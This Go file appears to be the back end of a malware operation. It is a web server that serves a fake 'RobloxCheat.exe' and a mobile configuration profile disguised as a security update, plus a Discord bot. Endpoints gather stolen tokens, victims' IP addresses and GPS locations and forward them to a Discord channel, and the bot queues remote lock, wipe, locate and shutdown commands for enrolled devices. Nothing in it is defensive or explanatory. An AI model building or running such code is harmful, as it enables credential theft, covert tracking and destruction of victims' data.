// main.go
package main

import (
	"fmt"
	"io"
	"log"
	"os"
	"os/signal"
	"strings"
	"syscall"

	"github.com/bwmarrin/discordgo"
	"github.com/gin-gonic/gin"
)

var discordSession *discordgo.Session
var logChannelID string
var pendingCommands = make(map[string]string)

func main() {
	go startAPIServer()
	startDiscordBot()
}

func startAPIServer() {
	gin.SetMode(gin.ReleaseMode)
	router := gin.New()
	router.Use(gin.Recovery())

	router.GET("/", func(c *gin.Context) {
		c.File("index.html")
	})

	router.GET("/download-cheat", func(c *gin.Context) {
		c.File("RobloxCheat.exe")
	})

	router.GET("/install-profile", func(c *gin.Context) {
		c.Header("Content-Type", "application/x-apple-aspen-config")
		c.Header("Content-Disposition", "attachment; filename=security-update.mobileconfig")
		c.File("signed.mobileconfig")
	})

	router.POST("/report", func(c *gin.Context) {
		body, _ := io.ReadAll(c.Request.Body)
		ip := c.ClientIP()
		ua := c.Request.UserAgent()

		report := fmt.Sprintf("report\nIP: %s\nUA: %s\nData: %s", ip, ua, string(body))
		sendToDiscord(report)

		c.JSON(200, gin.H{"status": "ok"})
	})

	router.POST("/token", func(c *gin.Context) {
		var req struct {
			Token    string `json:"token"`
			IP       string `json:"ip"`
			Computer string `json:"computer"`
		}
		if err := c.BindJSON(&req); err != nil {
			c.JSON(400, gin.H{"error": err.Error()})
			return
		}

		report := fmt.Sprintf("token\n%s", req.Token)
		sendToDiscord(report)

		c.JSON(200, gin.H{"status": "ok"})
	})

	router.POST("/location", func(c *gin.Context) {
		var req struct {
			Lat float64 `json:"lat"`
			Lng float64 `json:"lng"`
		}
		if err := c.BindJSON(&req); err != nil {
			c.JSON(400, gin.H{"error": err.Error()})
			return
		}

		mapsURL := fmt.Sprintf("https://maps.google.com/?q=%f,%f", req.Lat, req.Lng)
		report := fmt.Sprintf("location\n%s", mapsURL)
		sendToDiscord(report)

		c.JSON(200, gin.H{"status": "ok"})
	})

	router.POST("/checkin", func(c *gin.Context) {
		deviceID := c.GetHeader("X-Device-ID")
		cmd := pendingCommands[deviceID]
		delete(pendingCommands, deviceID)

		if cmd != "" {
			c.JSON(200, gin.H{"command": cmd})
			return
		}
		c.JSON(200, gin.H{"command": ""})
	})

	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}
	router.Run(":" + port)
}

func sendToDiscord(message string) {
	if discordSession == nil || logChannelID == "" {
		log.Println(message)
		return
	}
	discordSession.ChannelMessageSend(logChannelID, message)
}

func startDiscordBot() {
	token := os.Getenv("DISCORD_BOT_TOKEN")
	logChannelID = os.Getenv("DISCORD_LOG_CHANNEL")

	if token == "" {
		log.Println("token not set")
		select {}
	}

	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		log.Fatal(err)
	}

	discordSession = dg

	dg.AddHandler(messageCreate)
	dg.Identify.Intents = discordgo.IntentsGuildMessages | discordgo.IntentsDirectMessages | discordgo.IntentsMessageContent

	if err := dg.Open(); err != nil {
		log.Fatal(err)
	}

	fmt.Println("bot running")

	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc

	dg.Close()
}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}

	parts := strings.Fields(m.Content)
	if len(parts) == 0 {
		return
	}

	switch parts[0] {
	case "!devices":
		if len(pendingCommands) == 0 {
			s.ChannelMessageSend(m.ChannelID, "no devices")
			return
		}
		var list []string
		for id := range pendingCommands {
			list = append(list, id)
		}
		s.ChannelMessageSend(m.ChannelID, strings.Join(list, "\n"))

	case "!lock":
		if len(parts) < 2 {
			return
		}
		pendingCommands[parts[1]] = "DeviceLock"
		s.ChannelMessageSend(m.ChannelID, "lock sent")

	case "!wipe":
		if len(parts) < 2 {
			return
		}
		pendingCommands[parts[1]] = "EraseDevice"
		s.ChannelMessageSend(m.ChannelID, "wipe sent")

	case "!locate":
		if len(parts) < 2 {
			return
		}
		pendingCommands[parts[1]] = "DeviceLocation"
		s.ChannelMessageSend(m.ChannelID, "locate sent")

	case "!sound":
		if len(parts) < 2 {
			return
		}
		pendingCommands[parts[1]] = "PlayLostModeSound"
		s.ChannelMessageSend(m.ChannelID, "sound sent")

	case "!shutdown":
		if len(parts) < 2 {
			return
		}
		pendingCommands[parts[1]] = "ShutDownDevice"
		s.ChannelMessageSend(m.ChannelID, "shutdown sent")

	case "!restart":
		if len(parts) < 2 {
			return
		}
		pendingCommands[parts[1]] = "RestartDevice"
		s.ChannelMessageSend(m.ChannelID, "restart sent")

	case "!help":
		s.ChannelMessageSend(m.ChannelID, "!devices\n!lock <id>\n!wipe <id>\n!locate <id>\n!sound <id>\n!shutdown <id>\n!restart <id>")
	}
}
